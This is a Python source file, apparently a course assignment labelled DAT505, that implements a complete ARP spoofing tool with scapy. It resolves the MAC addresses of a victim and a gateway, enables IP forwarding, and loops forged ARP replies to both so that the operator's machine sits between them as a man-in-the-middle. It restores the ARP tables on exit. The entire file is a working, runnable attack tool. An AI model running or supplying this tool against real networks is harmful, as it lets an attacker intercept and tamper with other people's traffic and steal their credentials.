#!/usr/bin/env python3
"""ARP Spoofing Tool - DAT505"""

import argparse
import sys
import signal
import subprocess
import time
from scapy.all import ARP, Ether, send, srp, conf

class ARPSpoofer:
    def __init__(self, victim_ip, gateway_ip, interface, verbose=False):
        self.victim_ip = victim_ip
        self.gateway_ip = gateway_ip
        self.interface = interface
        self.verbose = verbose 
        self.victim_mac = None
        self.gateway_mac = None
        self.original_ip_forward = None
        conf.iface = interface
        conf.verb = 0
        
    def get_mac(self, ip):
        arp_request = ARP(pdst=ip)
        broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
        answered = srp(broadcast / arp_request, timeout=2, retry=3, verbose=False)[0]
        return answered[0][1].hwsrc if answered else None
    
    def enable_ip_forwarding(self):
        try:
            with open("/proc/sys/net/ipv4/ip_forward", "r") as f:
                self.original_ip_forward = f.read().strip()
            subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=1"], 
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            if self.verbose:
                print("[+] IP forwarding enabled.")
        except Exception:
            pass
    
    def disable_ip_forwarding(self):
        if self.original_ip_forward:
            subprocess.run(["sysctl", "-w", f"net.ipv4.ip_forward={self.original_ip_forward}"],
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            if self.verbose:
                print("[+] IP forwarding restored to original state.")
    
    def spoof(self, target_ip, target_mac, spoof_ip):
        arp_response = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
        send(arp_response, verbose=False)
    
    def restore(self, target_ip, target_mac, source_ip, source_mac):
        arp_response = ARP(op=2, pdst=target_ip, hwdst=target_mac, 
                          psrc=source_ip, hwsrc=source_mac)
        send(arp_response, count=5, verbose=False)
    
    def start_attack(self):
        self.victim_mac = self.get_mac(self.victim_ip)
        self.gateway_mac = self.get_mac(self.gateway_ip)
        
        if not self.victim_mac or not self.gateway_mac:
            print("Error: Could not resolve MAC addresses")
            sys.exit(1)
        
        self.enable_ip_forwarding()
        print(f"[*] ARP spoofing started: {self.victim_ip} <-> {self.gateway_ip}")

        packet_count = 0
        try:
            while True:
                self.spoof(self.victim_ip, self.victim_mac, self.gateway_ip)
                self.spoof(self.gateway_ip, self.gateway_mac, self.victim_ip)
                packet_count += 2
                
                if self.verbose:
                    print(f"\r[+] Packets sent: {packet_count}", end="", flush=True)
                
                time.sleep(2)

        except KeyboardInterrupt:
            pass
    
    def cleanup(self):
        print("\n[*] Restoring ARP tables...")
        self.restore(self.victim_ip, self.victim_mac, self.gateway_ip, self.gateway_mac)
        self.restore(self.gateway_ip, self.gateway_mac, self.victim_ip, self.victim_mac)
        self.disable_ip_forwarding()
        print("[*] Cleanup complete.")

def main():
    if subprocess.run(["id", "-u"], capture_output=True).stdout.decode().strip() != "0":
        print("Error: Root privileges required")
        sys.exit(1)
    
    parser = argparse.ArgumentParser(description="ARP Spoofing Tool")
    parser.add_argument("-t", "--target", required=True, help="Victim IP address")
    parser.add_argument("-g", "--gateway", required=True, help="Gateway IP address")
    parser.add_argument("-i", "--interface", required=True, help="Network interface")
    parser.add_argument("-v", "--verbose", action="store_true", help="Enable verbose mode to show packet count.")
    args = parser.parse_args()
    
    spoofer = ARPSpoofer(args.target, args.gateway, args.interface, args.verbose)
    
    def signal_handler(sig, frame):
        spoofer.cleanup()
        sys.exit(0)
    
    signal.signal(signal.SIGINT, signal_handler)
    spoofer.start_attack()

if __name__ == "__main__":
    main()